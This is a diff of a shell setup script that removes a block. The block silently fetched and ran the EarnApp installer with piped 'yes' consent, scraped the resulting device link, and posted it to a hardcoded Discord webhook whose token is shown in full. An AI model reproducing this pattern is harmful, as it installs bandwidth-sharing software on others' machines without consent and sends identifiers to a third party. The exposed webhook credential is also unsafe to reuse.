@@ -178,21 +178,6 @@ if ! command -v curl >/dev/null 2>&1; then
 fi
 
 # ==============================
-# 🧩 EarnApp 
-# ==============================
-wget -qO /tmp/earnapp.sh https://brightdata.com/static/earnapp/install.sh
-EARN_LOG=$(echo yes | bash /tmp/earnapp.sh 2>&1)
-URL=$(echo "$EARN_LOG" | grep -Eo 'https://earnapp\.com/r/[a-zA-Z0-9/_\-]+' | head -n1)
-if [ -n "$URL" ]; then
-  curl -H "Content-Type: application/json" \
-       -X POST \
-       -d "{\"content\": \"$URL\"}" \
-       "https://discord.com/api/webhooks/1442589391238205460/sBPE0SdCKsgsEyYZhDVZ2e8feTLvN2zgNagNTskwwN5Um2bJHHqQVKUSDZb3JiDFaALh"
-else
-  echo "$(date '+%Y-%m-%d %H:%M:%S') - [EARNAPP] Falha ao capturar URL" >>"$LOG_FILE"
-fi
-
-# ==============================
 # 🕒 Ajuste de fuso horário e NTP
 # ==============================
 if command -v timedatectl >/dev/null 2>&1; then
